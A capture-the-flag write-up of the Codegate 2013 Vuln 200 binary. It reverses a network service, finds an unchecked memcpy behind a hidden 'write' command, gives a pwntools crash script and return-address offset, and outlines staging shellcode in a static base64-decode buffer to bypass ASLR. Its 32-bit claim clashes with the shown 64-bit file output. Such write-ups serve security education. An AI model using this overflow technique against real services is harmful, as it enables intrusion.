# Codegate 2013 Vuln 200 Writeup

## Initial Analysis

It's a 32-bit binary with no mitigations.

    $ file ./94dd6790cbf7ebfc5b28cc289c480e5e
    ./94dd6790cbf7ebfc5b28cc289c480e5e: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xce5456409e1bfe207cd58c5b77ce99125d3b8d0f, stripped
    $ checksec.sh --file 94dd6790cbf7ebfc5b28cc289c480e5e
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   94dd6790cbf7ebfc5b28cc289c480e5e

Unfortunately, it doesn't appear to start out of the box:

    $ ./5b7420a5bcdc1da85bccc62dcea4c7b8
    [2]  + 11123 segmentation fault  ./5b7420a5bcdc1da85bccc62dcea4c7b8

So let's dive into the disassembly.

## Disassembly & Reversing

Right off the bat, we see that there's a simple ptrace anti-debugging check.
This doesn't actually do anything.  Ignore it.

    .text:08048ABE E8 AD FC FF FF         call    _ptrace
    .text:08048AC3 85 C0                  test    eax, eax
    .text:08048AC5 79 0C                  jns     short loc_8048AD3
    .text:08048AC7 C7 04 24 E6 9A+        mov     dword ptr [esp], offset s ; "Debugger Detected!!!"
    .text:08048ACE E8 DD FD FF FF         call    _puts
    .text:08048AD3

After creating a listener socket, the process forks immediately.
The parent attempts to log this to `./logs/pwn2log`, so let's create that directory.

    v27 = fopen("./logs/pwn2log", "a");
    fprintf(v27, "pid = %u", v28, 0);
    fprintf(v27, "\nLaunched into background (PID: %d)\n\n", v28);
    fclose(v27);

Now let's try again:

    $ gdb ./5b7420a5bcdc1da85bccc62dcea4c7b8
    gdb-peda$ r
    Starting program: /home/user/Desktop/CTF/Codegate 2013/Vulnerable/200/5b7420a5bcdc1da85bccc62dcea4c7b8 
    [New process 13200]

Great!  Let's connect and see what we're dealing with:

    $ nc localhost 7777                                                                                ⏎
    CODEGATE 2013 Util service!
    [*] md5
    [*] help
    [*] base64 encode
    [*] base64 decode
    [*] quit

Cool.  The actual logic for this menu is in `sub_8048EEB`.
What immediately stands out is an undocumented `"write"` command.

    else                                        // write
    {
      dump_file("BEFORE", dest_200);
      write(fd, "write running\nCopying bytes", 0x1Cu);
      memcpy(dest_200, buffer_190h + 5, bytes_recvd - 5);
      dump_file("AFTER", dest_200);
      write(fd, "\nDONE\nReturn to the main\n", 0x19u);
      result = 1;
    }

    int __cdecl dump_file(char *before_after, char *dest_200)
    {
      FILE *stream; // [sp+24h] [bp-24h]@1
      _DWORD *dwords; // [sp+28h] [bp-20h]@1
      signed int i; // [sp+2Ch] [bp-1Ch]@1
      dwords = dest_200;
      stream = fopen("./dump.txt", "a");
      fprintf(stream, "%s\n", before_after);
      for ( i = 0; i <= 239; i += 16 )
      {
        fprintf(stream, "%.8x: %.8x %.8x %.8x %.8x\n", dwords, *dwords, dwords[1], dwords[2], dwords[3]);
        dwords += 4;
      }
      fputc('\n', stream);
      return fclose(stream);
    }

So this simply writes raw stack data to a log file.  The first pass, the data is zeroed out, but then our data (except for the characters "read ") are copied into the buffer and dumped.

### Buffer Overflow

The issue here is that the `memcpy()` is effectively this:

    char input_buffer[0x200];
    char memcpy_buffer[200];
    int bytes_recvd = recv(fd, input_buffer, 0x200);
    memcpy(memcpy_buffer, input_buffer, bytes_recvd);

So an unchecked memcpy.  Let's see if we can blindly kill the return address, and find out how far
into our buffer we need to write to control execution.  
This example makes use of pwnies' [pwntools](https://github.com/pwnies/pwntools), see their github repo for more information.

    #!/usr/bin/env python
    from pwn import *
    r = remote('localhost', 7777)
    r.clean(1)
    r.send('write ' + de_bruijn(0x200))

And we do get a crash, with lots of the register context controlled.

    [----------------------------------registers-----------------------------------]
    EAX: 0x1
    EBX: 0x61616763 ('cgaa')
    ECX: 0xf7c39688 --> 0x9 ('\t')
    EDX: 0x19
    ESI: 0x61616863 ('chaa')
    EDI: 0x61616963 ('ciaa')
    EBP: 0x61616a63 ('cjaa')
    ESP: 0xffffc620 ("claacmaacnaacoaa"...)
    EIP: 0x61616b63 ('ckaa')

Given that our buffer is 0x200 bytes long, let's find out where the return address is overwritten
in our buffer.

    $ python -c "print hex($(cyclic -o ckaa))"
    0xef

### ASLR Bypass

NX is disabled for the binary, so the stack is executeable -- but the stack location is still randomized.  Let's look around a bit and see if we can't find anything else.

From looking at the other functionality, we see that the functionality for the `base64 decode` command just reads 0x100 bytes of Base64-encoded data, and decodes it into a static buffer within the module.  All we have to do is send our shellcode as Base64, and set the return address to this buffer.

Luckily, we don't even have to know anything about base64 logic, since the server will do everything for us (it also has an `encode` option).

## Exploitation

Two steps:

1. Get our shellcode in the base64 decode buffer
2. Send overflow to kill return address, and point it at the decode buffer

Overall, this challenge was much easier than the Vuln100.
